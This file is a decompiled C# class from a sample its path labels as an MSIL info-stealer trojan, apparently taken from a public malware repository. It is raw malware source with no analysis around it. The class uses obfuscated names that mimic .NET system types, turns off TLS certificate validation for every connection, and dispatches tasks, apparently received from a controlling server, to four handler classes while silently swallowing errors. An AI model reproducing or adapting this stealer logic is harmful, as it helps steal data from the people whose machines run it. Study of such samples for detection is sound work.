// Decompiled with JetBrains decompiler
// Type: SystemNetNetworkInformationNetworkInformationPermissionAttributeY
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System.Collections.Generic;
using System.Net;
using System.Net.Security;

public class SystemNetNetworkInformationNetworkInformationPermissionAttributeY
{
  public SystemNetNetworkInformationNetworkInformationPermissionAttributeY(
    SystemMediaSoundPlayerp result)
  {
    this.Result = result;
    try
    {
      try
      {
        ServicePointManager.SecurityProtocol |= SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      ServicePointManager.ServerCertificateValidationCallback += (RemoteCertificateValidationCallback) ((sender, certificate, chain, sslPolicyErrors) => true);
    }
    catch
    {
    }
  }

  public SystemMediaSoundPlayerp Result { get; }

  public List<int> ReleaseUpdates(
    IEnumerable<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU> tasks)
  {
    List<int> intList = new List<int>();
    try
    {
      foreach (SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU task in tasks)
      {
        if (this.Result.DomainExists(task.Id4))
        {
          SystemNetFtpDataStreamg netFtpDataStreamg = new SystemNetFtpDataStreamg();
          if (netFtpDataStreamg.IsValidAction(task.Id3) && netFtpDataStreamg.Process(task))
            intList.Add(task.Id1);
          SystemNetMimeContentTypeu mimeContentTypeu = new SystemNetMimeContentTypeu();
          if (mimeContentTypeu.IsValidAction(task.Id3) && mimeContentTypeu.Process(task))
            intList.Add(task.Id1);
          SystemCollectionsGenericSystemQueueDebugViewB systemQueueDebugViewB = new SystemCollectionsGenericSystemQueueDebugViewB();
          if (systemQueueDebugViewB.IsValidAction(task.Id3) && systemQueueDebugViewB.Process(task))
            intList.Add(task.Id1);
          SystemNetConnectioncDisplayClassp connectioncDisplayClassp = new SystemNetConnectioncDisplayClassp();
          if (connectioncDisplayClassp.IsValidAction(task.Id3) && connectioncDisplayClassp.Process(task))
            intList.Add(task.Id1);
        }
      }
    }
    catch
    {
    }
    return intList;
  }
}
